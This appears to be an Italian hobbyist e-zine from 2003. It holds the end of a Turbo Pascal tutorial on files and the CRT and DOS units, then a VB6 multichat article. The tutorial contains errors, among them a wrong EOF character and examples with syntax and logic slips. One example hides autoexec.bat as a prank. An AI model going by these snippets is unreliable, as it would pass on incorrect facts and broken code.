 |e questo è quanto per quanto riguarda l'istruzione ASSIGN                   |
 |                                                                            |
 |bè, adesso abbiamo assegnato il file, ora dobbiamo scegliere se aprire o    |
 |creare il file, con le istruzioni reset o rewrite                           |
 |le loro forme sono uguali...                                                |
 |                                                                            |
 |reset(_file_);                                                              |
 |rewrite(_file_);                                                            |
 |                                                                            |
 |example...                                                                  |
 |                                                                            |
 |reset(ax);                                                                  |
 |rewrite(ax);                                                                |
 |                                                                            |
 |N.B. in teoria, le definizioni "aprire" o "creare" sono sbagliate, perché il|
 |compilatore (qualsiasi esso sia) li ridefinisce in "aperto in solo input" e |
 |"aperto in solo output"                                                     |
 |questo che vuol dire?                                                       |
 |semplicemente, che se si usa il comando reset per "aprire" un file, non si  |
 |potrà scrivere al suo interno, mentre quando si usa il comando rewrite per  |
 |"creare" un file, non si potrà leggere al suo interno... tutto ciò è molto  |
 |scomodante, al contrario del C che si può scegliere tutto: Appending, sola  |
 |lettura, binario...                                                         |
 |                                                                            |
 |ora dobbiamo scegliere le istruzioni per "manipolare" il file...            |
 |il TP supporta due funzioni standard per leggere o scrivere sul file e sono |
 |read e write, PROPRIO COSI! LE STESSE PER LEGGERE O SCRIVERE DALLA CONSOLE! |
 |uso:                                                                        |
 |                                                                            |
 |read ( _file_ , _var_ ) ;                                                   |
 |write ( _file_ , _var_ ) ;                                                  |
 |                                                                            |
 |example...                                                                  |
 |                                                                            |
 |read(ax,ch); {contando ch come un char}                                     |
 |write(ax,ch);                                                               |
 |                                                                            |
 |nota:                                                                       |
 |write, scrive nel file nella modalità INS (non so se si chiama così, ma io  |
 |la chiamo così), cioè, scrive il carattere e cancella quello che lo segue, o|
 |meglio sovrascrive un carattere su un altro, qualunque esso sia             |
 |                                                                            |
 |ora che abbiamo scritto sul file, dobbiamo chiuderlo, altrimenti le         |
 |modifiche andranno perse                                                    |
 |il comando è close, il suo uso è uguale a reset o rewrite                   |
 |uso:                                                                        |
 |                                                                            |
 |close(_file_);                                                              |
 |                                                                            |
 |example...                                                                  |
 |                                                                            |
 |close(ax);                                                                  |
 |                                                                            |
 |Ecco qua, questo progettino legge ogni singolo carattere dalla tastiera e lo|
 |mette dentro il file che selezionate                                        |
 |                                                                            |
 +--------------------------------- cut here ---------------------------------+
 |program texto;                                                              |
 |uses crt;                                                                   |
 |var fdata:file of char;                                                     |
 |    ch:char;                                                                |
 |    fname:string;                                                           |
 |begin                                                                       |
 |writeln('Inserisci il nome del file');                                      |
 |readln(fname);                                                              |
 |assign(fdata,fname);                                                        |
 |rewrite(fdata);                                                             |
 |clrscr;                                                                     |
 |writeln(' Scrivi ciò che devi inserire nel file:');                         |
 |writeln(' premi ESC per uscire');                                           |
 |reset(fdata);                                                               |
 |rewrite(fdata);                                                             |
 |while (ch<>chr(27)) do                                                      |
 | begin                                                                      |
 |  ch:=readkey;                                                              |
 |  write(ch);                                                                |
 |  write(fdata,ch);                                                          |
 | end;                                                                       |
 |write(fdata,chr(20));                                                       |
 |close(fdata);                                                               |
 |end.                                                                        |
 +--------------------------------- cut here ---------------------------------+
 |                                                                            |
 |Ecco, leggendo, mi sono accorto che c'è qualcosa che non vi ho spiegato     |
 |prima, e sarebbe l'EOF, che vuol dire EndOfFile, in poche parole, l'EOF     |
 |sarebbe un carattere che in un file determina la fine del file appunto, ed è|
 |il carattere 20, quindi, il ciclo finisce non appena trova quel carattere.  |
 |                                                                            |
 |e qui chiudiamo definitivamente la parentesi dei file                       |
 |                                                                            |
 +----------------------------------------------------------------------------+
 |NUOVE FUNZIONI E PROCEDURE DELLA LIBRERIA CRT                               |
 |                                                                            |
 |CLREOL;                                                                     |
 |cancella tutti i caratteri dal cursore fino alla fine della linea (Console) |
 |                                                                            |
 |DELLINE;                                                                    |
 |cancella tutta la linea dov'è presente il cursore (Console)                 |
 |                                                                            |
 |GOTOXY(X,Y);                                                                |
 |va nella coordinata X,Y della console                                       |
 |                                                                            |
 |HIGHVIDEO;                                                                  |
 |seleziona i caratteri di alta intensità (influisce sui colori)              |
 |ex.                                                                         |
 |il grigio normale della console diventa bianco.                             |
 |ecc.                                                                        |
 |                                                                            |
 |LOWVIDEO;                                                                   |
 |come sopra, ma a bassa intensità                                            |
 |                                                                            |
 |NORMVIDEO;                                                                  |
 |come sopra, ma a normale intensità (colori standard)                        |
 |                                                                            |
 |INSLINE;                                                                    |
 |inserisce una riga vuota alla posizione del cursore (Console)               |
 |                                                                            |
 |KEYPRESSED;                                                                 |
 |restituisce FALSE se non è premuto niente, TRUE se è stato premuto un tasto |
 |                                                                            |
 |SOUND(X);                                                                   |
 |avvia lo speaker interno del computer a frequenza X                         |
 |                                                                            |
 |NOSOUND;                                                                    |
 |chiude lo speaker                                                           |
 |                                                                            |
 |TEXTMODE(X);                                                                |
 |ingrandisce i caratteri                                                     |
 |X può valere 0 o 1 (caratteri normali)                                      |
 |oppure 2 o 3 (caratteri grandi)                                             |
 |rispettivamente nelle variabili della libreria                              |
 |BW40 (0)                                                                    |
 |CO40 (1)                                                                    |
 |BW80 (2)                                                                    |
 |CO80 (3)                                                                    |
 |                                                                            |
 |WHEREX;                                                                     |
 |ritorna le coordinate nella console di dove si trova il cursore             |
 |                                                                            |
 |VARIABILI CRT                                                               |
 |                                                                            |
 |VAR CHECKBREAK : BOOLEAN = TRUE;                                            |
 |quando il valore di questa boolean è TRUE i tasti ALT+F4, CTRL+C e tutti i  |
 |tasti di uscita sono abilitati, quando è FALSE sono disabilitati            |
 |                                                                            |
 |VAR CHECKEOF : BOOLEAN = FALSE;                                             |
 |se checkeof è TRUE allora premendo CTRL+Z si metterà un "segnalibro" alla   |
 |fine del file se è FALSE allora CTRL+Z non ha effetto                       |
 |                                                                            |
 |VAR DIRECTVIDEO : BOOLEAN = TRUE;                                           |
 |quando directvideo è TRUE allora i comandi per la gestione dell'output      |
 |(WRITE e WRITELN) non si effettueranno chiamate al BIOS (processo           |
 |rallentante) per visualizzare gli output se invece è FALSE, l'output si     |
 |effettuerà attraverso chiamate al BIOS                                      |
 |                                                                            |
 |VAR TEXTATTR : BYTE;                                                        |
 |contiene gli attributi correnti del testo (textcolor & textbackground)      |
 |si possono anche cambiare gli attributi del testo direttamente da TEXTATTR  |
 +----------------------------------------------------------------------------+
 |                                                                            |
 |NUOVE FUNZIONI E PROCEDURE DELLA LIBRERIA DOS                               |
 |                                                                            |
 |FUNCTION DISKFREE;                                                          |
 |function DiskFree(Drive: Byte): Longint;                                    |
 |ritorna lo spazio libero nel Drive selezionato                              |
 |0 - Predefinito                                                             |
 |1 - A                                                                       |
 |2 - B                                                                       |
 |3 - C                                                                       |
 |eccetera                                                                    |
 |                                                                            |
 |Example!                                                                    |
 |writeln(DiskFree(3)); {scrive la memoria libera che c'è nel drive C}        |
 |N.B.                                                                        |
 |La funzione ritornerà -1 se la lettura nel drive non ha successo o il drive |
 |è invalido                                                                  |
 |                                                                            |
 |FUNCTION DISKSIZE;                                                          |
 |function DiskSize(Drive: Byte): Longint;                                    |
 |ritorna lo spazio totale (libero e occupato) nel Drive selezionato          |
 |0 - Predefinito                                                             |
 |1 - A                                                                       |
 |2 - B                                                                       |
 |3 - C                                                                       |
 |eccetera                                                                    |
 |                                                                            |
 |Example!                                                                    |
 |writeln(Disksize(3)); {scrive la memoria occupata nel drive C}              |
 |N.B.                                                                        |
 |La funzione ritornerà -1 se la lettura nel drive non ha successo o il drive |
 |è invalido                                                                  |
 |                                                                            |
 |FUNCTION DOSEXITCODE;                                                       |
 |function DosExitCode: Word;                                                 |
 |ritorna l'uscita del codice di un SubProcesso                               |
 |Un subprocesso viene avviato grazie alla procedura Exec (che vedremo poi)   |
 |Il programma ritorna se l'uscita del subprocessoè avvenuta normalmente,     |
 |questa funzione può ritornare:                                              |
 |0 - se l'uscita è avvenuta normalmente                                      |
 |1 - se l'uscita è avvenuta con la pressione di CTRL+C                       |
 |2 - se l'uscita è avvenuta per colpa di un errore del device                |
 |3 - se l'uscita è avvenuta con la procedura KEEP (che vedremo poi)          |
 |                                                                            |
 |FUNCTION DOSVERSION;                                                        |
 |function DosVersion: Word;                                                  |
 |ritorna la versione del Dos, però i bytes nella parte inferiore è la        |
 |versione maggiore mentre i bytes nella parte superiore è la versione minore |
 |Example!                                                                    |
 +----------------------------------------------------------------------------+
 |{esempio di DosVersion}                                                     |
 |uses dos;                                                                   |
 |var ver: Word;                                                              |
 |begin                                                                       |
 |ver:=DosVersion;                                                            |
 |writeln('Questa è la versione ',Lo(ver),'.',Hi(ver),' del dos');            |
 |writeln('In ver è memorizzato ',ver);                                       |
 |writeln('Anche se in teoria sarebbe 0',ver);                                |
 |end.                                                                        |
 +----------------------------------------------------------------------------+
 |                                                                            |
 |FUNCTION ENVCOUNT;                                                          |
 |function EnvCount: Integer;                                                 |
 |ritorna le stringhe contenute nell'Autoexec                                 |
 |                                                                            |
 |FUNCTION ENVSTR;                                                            |
 |function EnvStr(Index: Integer): Integer;                                   |
 |ritorna una specifica stringa dell'autoexec                                 |
 |se la stringa è minore di 1 o maggiore di EnvCount, allora restituisce una  |
 |stringa vuota                                                               |
 |                                                                            |
 |PROCEDURE EXEC;                                                             |
 |procedure Exec(Path, CmdLine: string);                                      |
 |                                                                            |
 |esegue un programma (Path) con una linea di comandi (CmdLine)               |
 |quando bisogna eseguire un comando, conviene ridurre l'heap, col seguente   |
 |comando inserito nella prima riga, altrimenti non c'è abbastanza memoria ed |
 |esce col DosError 8 (vedremo poi)                                           |
 |                                                                            |
 |{$M $4000,0,0 }    { che vuol dire 16K di Stack e niente Heap }             |
 |{ Mi raccomando, le parentesi graffe ci vanno!!! }                          |
 |                                                                            |
 |solo che per eseguire un file ci vuole l'uso di Swapvectors, non è          |
 |sufficiente usare EXEC, vedremo poi                                         |
 |                                                                            |
 |FUNCTION FEXPAND;                                                           |
 |function FExpand(Path: PathStr): PathStr;                                   |
 |Nota: Il tipo PathStr, è un tipo definito nella libreria Dos, equivale a    |
 |STRING[79];                                                                 |
 |                                                                            |
 |Questa funzione ritorna la completa Path di un file...                      |
 |ad esempio, io ho il file TURBO.EXE nella cartella del mio compilatore      |
 |                                                                            |
 |FExpand(path) mi ritornerà questo:                                          |
 |                                                                            |
 |C:\TPX\BIN\TURBO.EXE                                                        |
 |e non semplicemente il nome del file                                        |
 |                                                                            |
 |Nota: se il file non esiste, il compilatore darà comunque l'indirizzo di    |
 |tutta la path (dove si trova il file exe)                                   |
 |                                                                            |
 |qui sorgono due problemi                                                    |
 |se il programma non è compilato, ma è semplicemente Runnato dal compilatore,|
 |succede che ogni volta che si usa la funzione FExpand, restituirà SEMPRE la |
 |path del compilatore                                                        |
 |Mentre invece, se si è già compilato e linkato il progetto, succederà che,  |
 |ovunque spostiamo il file, restituirà la path di dove il file si trova...   |
 |E TUTTO CIO' ANCHE SE IL FILE NON ESISTE!!!                                 |
 |                                                                            |
 |Il fatto è che finche viene usata una stringa per gestire questo genere di  |
 |cose, è normale quindi, se io ho il file nel desktop (a me) restituirà      |
 |                                                                            |
 |C:\WINDOWS\DESKTOP\FEXPANDEX.EXE                                            |
 |                                                                            |
 |quindi, se io voglio sapere la path del mIRC, che da me è                   |
 |C:\PROGRAMMI\MIRC\MIRC.EXE                                                  |
 |e tengo il file nel desktop, è naturale che mi restituirà                   |
 |                                                                            |
 |C:\WINDOWS\DESKTOP\MIRC.EXE                                                 |
 |                                                                            |
 |e questo mi fa incazzare...                                                 |
 |allora facciamo una cosina: mettiamo che il file che voglio non esiste,     |
 |allora, se non esiste in teoria: CHE ME LO DAI A FARE L'INDIRIZZO???        |
 |semplice, basta solo l'utilizzo di un'altra semplice funzione del Turbo     |
 |Pascal, FSearch...                                                          |
 +----------------------------------------------------------------------------+
 |{Uso di FExpand e di FSearch}                                               |
 |uses dos;                                                                   |
 |var s:PathStr;                                                              |
 |begin                                                                       |
 |s:=FSearch('MIRC.EXE',GetEnv('PATH'));                                      |
 |if s='' then                                                                |
 | writeln('File non trovato');                                               |
 |else                                                                        |
 | writeln('Trovato!');                                                       |
 | writeln(FExpand(s));                                                       |
 |end.                                                                        |
 +----------------------------------------------------------------------------+
 |non chiedetemi di spiegarvelo, perché lo capirete poi quando arriverete alla|
 |fine                                                                        |
 |                                                                            |
 |FUNCTION FSEARCH;                                                           |
 |function FSearch(Path: PathStr; DirList: string): PathStr;                  |
 |cerca in una lista di directories (DirList) un file, le directory in DirList|
 |devono essere separate dal carattere | (detto anche PIPE)                   |
 |                                                                            |
 |PROCEDURE FSPLIT;                                                           |
 |procedure FSplit(Path:PathStr; Dir:DirStr; Name:NameStr; Ext:ExtStr);       |
 |                                                                            |
 |Divide un file nei suoi normali tre componenti (Directory, Nome, Estensione)|
 |                                                                            |
 |i tipi DirStr, NameStr, ExtStr, equivalgono rispettivamente i tipi          |
 |string[67], string[8], string[4].                                           |
 |                                                                            |
 |PROCEDURE GETCBREAK;                                                        |
 |procedure GetCBreak(var Break: Boolean);                                    |
 |Ritorna lo stato di CTRL-Break controllando nel dos                         |
 |procedura correlata con SETCBREAK                                           |
 |                                                                            |
 |PROCEDURE GETDATE;                                                          |
 |procedure GetDate(var Year, Month, Day, DayOfWeek: Word);                   |
 |Ritorna la data nel formato (ANNO,MESE,GIORNO,GIORNO_SETTIMANA)             |
 |                                                                            |
 |N.B.                                                                        |
 |L'anno sta in mezzo a 1980-2099, il mese 1-12, il giorno 1-31 e il          |
 |giornosett 0-6 dove 0 corrisponde a Domenica                                |
 |                                                                            |
 |nel caso non sapete proprio come usare GETDATE, allora vi faccio un         |
 |miniprogettino                                                              |
 |                                                                            |
 +----------------------------------------------------------------------------+
 |{ progetto GetDate }                                                        |
 |uses dos,crt;                                                               |
 |const giornosett:array[0..6] of string = ('Domenica','Lunedì','Martedì',    |
 |      'Mercoledì','Giovedì','Venerdì','Sabato');                            |
 |var a,m,g,gs:word;                                                          |
 |                                                                            |
 |begin                                                                       |
 | GetDate(a,m,g,gs);                                                         |
 | writeln('Oggi è ',giornosett[gs],', ',g:0,'/',m:0,'/',a:0);                |
 |end.                                                                        |
 +----------------------------------------------------------------------------+
 |Siccome oggi è Martedì 2 Settembre 2003 produrrà il seguente output:        |
 +----------------------------------------------------------------------------+
 |Oggi è Martedì 2/9/2003                                                     |
 +----------------------------------------------------------------------------+
 |Capit?                                                                      |
 |                                                                            |
 |FUNCTION GETENV;                                                            |
 |function GetEnv(Envvar: string): string;                                    |
 |ritorna il valore di una specifica variabile di ambiente                    |
 |la variabile può essere sia maiuscola che minuscola, ma non può avere il    |
 |carattere '=' (uguale) se l'ambiente specificato non esiste, ritorna una    |
 |stringa vuota...                                                            |
 |                                                                            |
 |qui uso come ambiente i comandi del COMMAND.COM                             |
 |a voi la fantasia...                                                        |
 +----------------------------------------------------------------------------+
 |{progetto GetEnv}                                                           |
 |{$M 8192,0,0}                                                               |
 |                                                                            |
 |uses dos;                                                                   |
 |var command:string[79];                                                     |
 |begin                                                                       |
 | write('Inserisci il comando DOS: ');                                       |
 | readln(command);                                                           |
 | if command <> '' then                                                      |
 |  command:='/C ' + command;                                                 |
 | Swapvectors;                                                               |
 | Exec(GetEnv('COMSPEC'),command);                                           |
 | Swapvectors;                                                               |
 | if DosError <> 0 then                                                      |
 |  writeln('Impossibile eseguire COMMAND.COM                                 |
 |end.                                                                        |
 +----------------------------------------------------------------------------+
 |                                                                            |
 |PROCEDURE GETFATTR;                                                         |
 |procedure GetFAttr(var F; var Attr: Word);                                  |
 |ritorna gli attributi di un file specifico                                  |
 |                                                                            |
 |F dev'essere una variabile File assegnata ma non "aperta" o "creata"        |
 |attr riceverà un valore registrato nell'unit-dos ($n) dove n sta per numero |
 |ed equivale alle seguenti costanti:                                         |
 |                                                                            |
 |ReadOnly  = $01;                                                            |
 |Hidden    = $02;                                                            |
 |SysFile   = $04;                                                            |
 |VolumeID  = $08;                                                            |
 |Directory = $10;                                                            |
 |Archive   = $20;                                                            |
 |AnyFile   = $3F;                                                            |
 |                                                                            |
 |Per chi non c'ha testa, faccio un mini progettino                           |
 +----------------------------------------------------------------------------+
 |{Progetto GetFAttr}                                                         |
 |uses dos,crt;                                                               |
 |var F:File;                                                                 |
 |    Attr:Word;                                                              |
 |    NF:string;                                                              |
 |begin                                                                       |
 |clrscr;                                                                     |
 |writeln('Inserisci il nome del file ');                                     |
 |readln(NF);                                                                 |
 |assign(F,NF);                                                               |
 |GetFAttr(F,Attr);                                                           |
 | if DosError <> 0 then writeln('DosError = ',DosError)                      |
 |else begin                                                                  |
 | writeln('Attr = ',Attr);                                                   |
 | case Attr of                                                               |
 |  ReadOnly:begin                                                            |
 |            writeln(' File di sola lettura');                               |
 |           end;                                                             |
 |  Hidden:begin                                                              |
 |          writeln(' File nascosto');                                        |
 |         end;                                                               |
 |  SysFile:begin                                                             |
 |           writeln(' File di sistema');                                     |
 |          end;                                                              |
 | VolumeID:begin                                                             |
 |           writeln(' Volume ID');                                           |
 |          end;                                                              |
 | Directory:begin                                                            |
 |            writeln(' Cartella');                                           |
 |           end;                                                             |
 | Archive:begin                                                              |
 |          writeln(' Archivio (file normale)');                              |
 |         end;                                                               |
 | end;                                                                       |
 |end.                                                                        |
 +----------------------------------------------------------------------------+
 |                                                                            |
 |PROCEDURE GETFTIME;                                                         |
 |procedure GetFTime(var F; var Time:Longint);                                |
 |ritorna la data e l'ora dell'ultima modifica di un file                     |
 |                                                                            |
 |F dev'essere una variabile File assegnata                                   |
 |il Time ritornato può essere spacchettato con una chiamata a UnpackTime     |
 |che vedrete poi come si usa                                                 |
 |Procedura collegata con SetFTime                                            |
 |                                                                            |
 |PROCEDURE GETTIME;                                                          |
 |procedure GetTime(var Hour, Minute, Second, Sec100: Word);                  |
 |Ritorna l'ora esatta                                                        |
 |per chi non minda... allora spiego                                          |
 |                                                                            |
 +----------------------------------------------------------------------------+
 |{ progetto GetTime }                                                        |
 |uses dos,crt;                                                               |
 |var h,m,s,sc:word;                                                          |
 |begin                                                                       |
 |repeat                                                                      |
 |gettime(h,m,s,sc);                                                          |
 |writeln('L''ora esatta è ',h,':',m,'.',s,'.',sc);                           |
 |until keypressed;                                                           |
 |end.                                                                        |
 +----------------------------------------------------------------------------+
 |Siccome adesso sono le 21:35 e qualcosa farà il seguente output in loop     |
 |vedendovi incrementare alla velocità superlucica gli ultimi due numeri:     |
 |L'ora esatta è 21:35.36.37                                                  |
 |L'ora esatta è 21:35.36.38                                                  |
 |L'ora esatta è 21:35.36.39                                                  |
 |L'ora esatta è 21:35.36.40                                                  |
 |L'ora esatta è 21:35.36.41                                                  |
 |L'ora esatta è 21:35.36.42                                                  |
 |eccetera... provare per credere (o vedere)                                  |
 |                                                                            |
 |Capit?                                                                      |
 |                                                                            |
 |PROCEDURE GETVERIFY;                                                        |
 |procedure GetVerify(var Verify: Boolean);                                   |
 |Ritorna lo stato del flag Verify nel dos. per capire meglio leggi SetVerify |
 |che si trova dopo...                                                        |
 |                                                                            |
 |PROCEDURE KEEP;                                                             |
 |procedure Keep(ExitCode: Word);                                             |
 |Keep, fa terminare il programma però mantenendolo in memoria                |
 |                                                                            |
 |L'intero programma rimane in memoria includendo Data Segment, Stack Segment |
 |e Heap.                                                                     |
 |Bisogna usare con cautela e attenzione questo comando, perché potrebbe fare |
 |un casino... Quindi, se studierete bene la prossima lezione, potrete usarlo |
 |alla perfezione Keep, quindi per adesso vi sconsiglio vivamente di usarlo   |
 |anche se il computer è vostro, potete farci quello che ci volete, ma io non |
 |sono responsabile...                                                        |
 |                                                                            |
 |PROCEDURE PACKTIME;                                                         |
 |procedure PackTime(var T: DateTime; var Time: Longint);                     |
 |Converte una variabile longint nella variabile DateTime "packandola"        |
 |                                                                            |
 |Example!                                                                    |
 +----------------------------------------------------------------------------+
 |{progetto PackTime}                                                         |
 |uses dos,crt;                                                               |
 |var ftime: Longint;                                                         |
 |    fpacked: DateTime;                                                      |
 |    com: file of char;                                                      |
 |begin                                                                       |
 |assign(com,'c:\windows\command.com');                                       |
 |GetFTime(com,ftime);                                                        |
 |PackTime(fpacked,ftime);                                                    |
 |{Adesso il contenuto di ftime è stato "packato" dentro fpacked, quindi si   |
 | può anche azzerare ftime}                                                  |
 |writeln(ftime);                                                             |
 |ftime:=0;                                                                   |
 |UnpackTime(ftime,fpacked);                                                  |
 |{qui "unpacka" fpacked dentro ftime, quindi ftime è di nuovo pieno}         |
 |writeln(ftime);                                                             |
 |{ora unpackiamolo di nuovo perché ftime è salvato nel modo del computer...} |
 |UnpackTime(ftime,fpacked);                                                  |
 |writeln(ftime);                                                             |
 |end.                                                                        |
 +----------------------------------------------------------------------------+
 |                                                                            |
 |PROCEDURE SETCBREAK;                                                        |
 |procedure SetCBreak(Break: Boolean);                                        |
 |Setta lo stato di Ctrl+C controllando nel dos                               |
 |Quando è spenta (FALSE) il dos controlla il Ctrl+C solo durante il flusso di|
 |Input-Output su console o su stampante                                      |
 |Quando è accesa (TRUE) i controlli sono fatti su qualsiasi chiamata del     |
 |sistema                                                                     |
 |                                                                            |
 |PROCEDURE SETDATE;                                                          |
 |procedure SetDate(Year, Month, Day: Word);                                  |
 |dal nome inglese si può benissimo capire che questo comando imposta la data |
 |N.B(issimo).                                                                |
 |sono validi solo i seguenti parametri                                       |
 |Anni: da 1980-2099, Mesi da 1-12 e Giorni da 0-31                           |
 |se i parametri sono invalidi la chiamata a SetDate verrà ignorata           |
 |                                                                            |
 |PROCEDURE SETFATTR;                                                         |
 |procedure SetFAttr(var F; Attr: Word);                                      |
 |imposta gli attributi un file (nascosto, archivio, sola lettura...)         |
 |dove F è un file assegnato ma non aperto, mentre Attr è l'attributo che gli |
 |si vuole dare, e possono essere i seguenti                                  |
 |                                                                            |
 |ReadOnly  - Sola lettura                                                    |
 |Hidden    - Nascosto                                                        |
 |SysFile   - File di sistema                                                 |
 |VolumeID  - VolumeID (non ho idea di cosa vuol dire...                      |
 |Directory - Cartella                                                        |
 |Archive   - Archivio                                                        |
 |AnyFile   - Qualsiasi file (E NON QUALSIASI ALTRO FILE)                     |
 |                                                                            |
 |i possibili errori riportati da DosError sono:                              |
 |                                                                            |
 |3 - Indirizzo invalido                                                      |
 |5 - Access Denied (è inglish, ma è più figo!)                               |
 |                                                                            |
 |giusto per sgranchirvi la mente, il solito progettino della mutua...        |
 +----------------------------------------------------------------------------+
 |{progetto per SetFAttr}                                                     |
 |uses dos,crt;                                                               |
 |type autoexec = file of char;                                               |
 |var ax:autoexec;                                                            |
 |begin                                                                       |
 |assign(ax,'c:\autoexec.bat');                                               |
 |SetFAttr(ax,Hidden);         {OOOPS...}                                     |
 |writeln('Autoexec reso Nascosto... HAHAHAHAHA');                            |
 |SetFAttr(ax,Archive);        {FHEW!}                                        |
 |end.                                                                        |
 +----------------------------------------------------------------------------+
 |                                                                            |
 |PROCEDURE SETFTIME;                                                         |
 |procedure SetFTime(var F; Time: Longint);                                   |
 |Imposta la data e l'ora dell'ultima modifica su un file (F)                 |
 |F dev'essere assegnato e aperto...                                          |
 |Anche qui, i possibili errori vengono memorizzati nel DosError, e quindi    |
 |può essere solamente il 6 (Manipolazione File Invalida o non riuscita)      |
 |Sono validi solo i seguenti parametri                                       |
 |Ore: da 0-23, Minuti da 0-59, Secondi da 0-59, CentSec da 0-99              |
 |se i parametri sono invalidi la chiamata a SetFTime verrà ignorata          |
 |                                                                            |
 |PROCEDURE SETTIME;                                                          |
 |procedure SetTime(var Hour, Minute, Second, Sec100: Word);                  |
 |anche qui si può benissimo capire che questa procedura imposta l'ora        |
 |N.B.                                                                        |
 |Anche qui, il discorso dei parametri vale come quello di SetFTime           |
 |                                                                            |
 |PROCEDURE SETVERIFY;                                                        |
 |procedure SetVerify(Verify: Boolean);                                       |
 |P.S. (Pre Scrittum)                                                         |
 |Questa funzione è utilissima se volete crackare...                          |
 |Purtroppo non esistono anche impostazioni sugli altri flags... me speis     |
 |N.S. (Normal Scrittum)                                                      |
 |Imposta lo stato del flag Verify nel dos, quando è spento (FALSE), le       |
 |operazioni su disco non sono verificate, quando è accesa (TRUE) il contrario|
 |                                                                            |
 |facciamo un example per i nostri students                                   |
 +----------------------------------------------------------------------------+
 |{Esempio per GetVerify e per SetVerify}                                     |
 |uses dos,crt;                                                               |
 |const OffOn:array [Boolean] of String[3] = ('off','on');                    |
 |var v:boolean;                                                              |
 |begin                                                                       |
 |GetVerify(v);                                                               |
 |writeln('il verify flag è ',OffOn[v]);                                      |
 |v:=not(v);                                                                  |
 |writeln('spostiamo il flag verify a ',OffOn[v]);                            |
 |SetVerify(v);                                                               |
 |end.                                                                        |
 +----------------------------------------------------------------------------+
 |                                                                            |
 |PROCEDURE SWAPVECTORS;                                                      |
 |procedure SwapVectors;                                                      |
 |è troppo complicato da spiegarlo... ci metterei qualche anno solo per       |
 |trovare i termini itagliani giusti, e qualche decennio per metterli insieme |
 |voi limitatevi a sapere che non fa niente... (anche se qualcosa la fa)      |
 |e di metterla sempre prima e dopo un Exec (vedi prima)                      |
 |per prima e dopo intendo così:                                              |
 |                                                                            |
 |swapvectors;                                                                |
 |exec(blablabla);                                                            |
 |swapvectors;                                                                |
 |                                                                            |
 |v'as capì?                                                                  |
 |                                                                            |
 |Vi ho allegato il codice sorgente della libreria DOS                        |
 |                                                                            |
 |bien, this is all punks                                                     |
 |                                                                            |
 |byezz                                                                       |
 |                                                                            |
 |KoRnuto (o meglio Eimiar)                                                   |
 +----------------------------------------------------------------------------+


+--[PROGRAMMAZIONE]------------------------------------------------------[IL04]+
|  Titolo: Crearsi una multichat                                               |
|  Autore: Unrelated                                                           |
|  Lingua: Italiano                                                            |
|  E-zine: Informazionelibera                                                  |
+------------------------------------------------------------------------------+
¢•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••
.....•
....•
....•
..•
...•
......•
........•
........•
.........
.........•...•
.....•.••
...........
......•.............
........•.••.............
....••••••••...••••••••...............   Crearsi una MultiChat  ........
....•.••••••.•••••......................................................
..••••••••••••••••............          Lord Unrelated Lodeguns ........
••••••••.••••••••••.....................................................
..................................       01 Ottobre 2003 20.29  ........
.Disclaimer
 Incominciamo col dire che non ho tanta voglia di stare a  spiegarvi  il
 nativo di questa chat... prima cosa ho lavorato su un esempio multisock
 che ho trovato e ci ho messo un pò di variabili  una  analisi  completa
 racchiusa in una lista albero e altre cosette simili... quindi l'autore
 del multisock che vedrà le sue righe in questa chat si ricordi  che  le
 ha disposte a dominio pubblico e del resto controllando un libro che ho
 di vb ho notato che  anche  li erano riportate, perciò voglio solo dire
 che non ho  rimorsi  di  coscienza  avendo  non  codato  per intero  un
 software in VB.

.Intro
 Come si può evincere dal disclaimer oggi come oggi... dopo che Lord_Jex
 se ne è andato anche io ho un pò di confusione in testa...  quello  che
 mi rode di + è il fatto che un programmatore, un hacker e persone della
 stessa famiglia in questo mondo  hanno  tanta  di  quella  strafottenza 
 verso il prossimo che mi passa  la  voglia  di  stare  al  mondo,  sono 
 così incazzato che se per caso Naomi Campbell volesse  scopare  con  me 
 gli direi di no mandandola a fanculo... Lord_Jex in parte avevi ragione
 e se mai leggerai sto tutor ricordati che io sono sempre  io  e  che io
 non cambierò mai sempre tentando di migliorare e non guardando indietro
 , rilassato, aiuterò gli altri e poi me stesso.. come Caio Lucillio  in
 uno dei suoi tanti discorsi tra un satira e l'altra sulla Virtus.



 Allora per prima cosa avete bisogno del VisualBasic6 minimo, credo  che
 con  pochi  passaggi  lo  adatterete  anche  al .net,  kmq  la  chat in
 questione è molto semplice...  come  qualsiesi   chat è composta da  un 
 client e da un server. Il client per funzionare ha bisogno  dell'ip del
 server...

 Qui  di  seguito  è  inutile  riportarvi  tutto il codice che del resto
 l'ho sia semplificato, ho   messo   nel   server  la    visualizzazione
 in appositi text delle variabili  che  usa  il programma e sta completo 
 negli  allegati...   quindi  solo  i  newbies  si  troveranno   un   pò
 svantaggiati... un cosiglio  stampatevi  il nativo aiuta  moltissimo  a
 capire il codice che vi sta davanti... ;)

 Beh..Non mi resta nient'altro da  dire...  anche se vorrei sottolineare
 un pezzo  di  codice per il quale ne vado fiero...   anche perchè ci ho
 perso  sopra  circa  2 ore di tempo e forse anche di +...

----------------------------------------------------------------------
 Dim miastr, k
 Dim nick
 Dim i As Integer

  Dim y As String
  miastr = (Text4.Text)
  For i = 1 To Len(miastr) - 1
  k = Mid(miastr, 9, i)
  Next i
  y = StrConv(k, 2)
  Text1.Text = "Nick Numero :" + Text2.Text + " " + y
  Command1_Click

----------------------------------------------------------------------

 Attenzione  il  mio  problema non era tipo: dalla stringa <Command>123
 ricavare il pezzo <command> facendo un semplice len...     ma  dati  i 
 numeri di  caratteri  da levare...  far uscire "123" -  allora  alcuni 
 potrebbero dire...  povero  scemo  potevi fare un left 3 e selezionavi
 solo gli ultimi 3...  ma  il  fatto  è che al posto del 123 ci stavano
 caratteri variabili quindi era impossibile fare con il  metodo  left..
 non so se voi avete mai incontrato questo problema ma io  sinceramente 
 non sapevo come si potesse risolvere  del  resto  in  tanti  anni  non 
 avendolo mai incontrato... era impossibile che subito lo avessi saputo
 risolvere...
 ed  ho  buttato  giù ste 4 righe scolandomi una busta di latte e cacao.
 Il  bello  è  kmq che  un problema simile non era riportato in nessuno 
 dei  miei  manuali  e in internet i cari esempi non ci stavano, quindi
 diciamo  che  per  gli appassionati come me... quelle 4 righe li sopra 
 sono un source in esclusivissima varamente moooolto importate...  raga
 vi  lascio  alla  multichat di InformazioneLibera che è presente negli
 allegati...  BUON divertimeto e lasciatemi logorare in pace tra i miei
 mille pensieri di un mondo che va a sfacelo.

 Antonella un giorno riuscirò a dirti quello che provo per te e  magari
 cyber mi darà una mano...:)
 non so quando, non so dove, nè il perchè, nè il come ma
 sono sicuro che non ti lascerò scappare un'altra  volta,
